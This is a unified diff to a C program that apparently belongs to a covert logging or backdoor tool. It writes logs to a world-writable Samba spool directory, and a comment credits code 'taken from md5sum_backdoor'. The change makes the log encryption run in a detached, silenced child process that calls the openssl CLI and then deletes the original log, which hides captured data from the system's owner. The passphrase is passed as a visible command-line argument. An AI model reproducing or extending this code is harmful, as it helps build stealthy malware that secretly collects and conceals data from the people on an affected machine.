@@ -17,6 +17,7 @@
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/err.h>
+#include <sys/wait.h>
 
 
 #define LOG_DIR          "/var/spool/samba" // change to your directory. This is writeble by default from any users.
@@ -127,105 +128,47 @@ static int hex2bin(const char *hex, unsigned char *bin, size_t bin_len) {
 }
 
 static void encrypt_file(const char *inpath, const unsigned char *key, size_t key_len) {
-	FILE *in = fopen(inpath, "rb");
-	if (!in) {
-		perror("fopen input for encryption");
-		return;
-	}
-
-	char outpath[512];
-	snprintf(outpath, sizeof(outpath), "%s.bin", inpath);
-	FILE *out = fopen(outpath, "wb");
-	if (!out) {
-		perror("fopen output for encryption");
-		fclose(in);
-		return;
-	}
-
-	unsigned char iv[16];
-	if (RAND_bytes(iv, sizeof(iv)) != 1) {
-		fprintf(stderr, "RAND_bytes failed\n");
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		return;
-	}
-
-	if (fwrite(iv, 1, sizeof(iv), out) != sizeof(iv)) {
-		perror("fwrite IV");
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		return;
-	}
-
-	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-	if (!ctx) {
-		perror("EVP_CIPHER_CTX_new");
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		return;
-	}
-
-	if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
-		fprintf(stderr, "EVP_EncryptInit_ex failed\n");
-		EVP_CIPHER_CTX_free(ctx);
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		return;
-	}
-
-	unsigned char inbuf[4096];
-	unsigned char outbuf[4096 + EVP_CIPHER_CTX_block_size(ctx)];
-	int inlen, outlen;
-
-	while ((inlen = fread(inbuf, 1, sizeof(inbuf), in)) > 0) {
-		if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen) != 1) {
-			fprintf(stderr, "EVP_EncryptUpdate failed\n");
-			fclose(in);
-			fclose(out);
-			unlink(outpath);
-			EVP_CIPHER_CTX_free(ctx);
-			return;
-		}
-		if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
-			perror("fwrite ciphertext");
-			fclose(in);
-			fclose(out);
-			unlink(outpath);
-			EVP_CIPHER_CTX_free(ctx);
-			return;
-		}
-	}
-
-	if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
-		fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		EVP_CIPHER_CTX_free(ctx);
-		return;
-	}
-	if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
-		perror("fwrite final block");
-		fclose(in);
-		fclose(out);
-		unlink(outpath);
-		EVP_CIPHER_CTX_free(ctx);
-		return;
-	}
-
-	fclose(in);
-	fclose(out);
-	EVP_CIPHER_CTX_free(ctx);
-
-	if (unlink(inpath) != 0) {
-		perror("unlink original log file");
-	} else {
-		printf("Encrypted %s -> %s\n", inpath, outpath);
-	}
+    char outpath[512];
+    snprintf(outpath, sizeof(outpath), "%s.bin", inpath);
+    pid_t pid = fork();
+    if (pid < 0) return;
+    if (pid > 0) {
+        waitpid(pid, NULL, 0);
+        return;
+    }
+    setsid();
+    int devnull = open("/dev/null", O_RDWR);
+    if (devnull != -1) {
+        dup2(devnull, STDIN_FILENO);
+        dup2(devnull, STDOUT_FILENO);
+        dup2(devnull, STDERR_FILENO);
+        close(devnull);
+    }
+    char pass_arg[1024];
+    snprintf(pass_arg, sizeof(pass_arg), "pass:%s", (const char *)key);
+    pid_t enc_pid = fork();
+    if (enc_pid == 0) {
+        // taken from md5sum_backdoor, this is way more reliable way to cipher te input file!
+        char *cmd_args[] = {
+            "openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
+            "-in", (char*)inpath, 
+            "-out", outpath,
+            "-pass", pass_arg, 
+            NULL
+        };
+        execvp("openssl", cmd_args);
+        _exit(1);
+    } else if (enc_pid > 0) {
+        int status;
+        waitpid(enc_pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        	remove(inpath);
+            // unlink(inpath);
+        }
+    }
+    usleep(1000);
+    unlink(inpath); // unlink afterall
+    _exit(0);
 }
 
 
@@ -455,12 +398,7 @@ int main(int argc, char **argv) {
 		log_fp = NULL;
 	}
 	if (log_path[0]) {
-		unsigned char key[KEY_BYTES];
-		if (hex2bin(KEY_HEX_STR, key, KEY_BYTES) == 0) {
-			encrypt_file(log_path, key, KEY_BYTES);
-		} else {
-			fprintf(stderr, "Invalid hex key\n");
-		}
+		encrypt_file(log_path, (unsigned char *)KEY_HEX_STR, strlen(KEY_HEX_STR));
 	}
 
 	return 0;
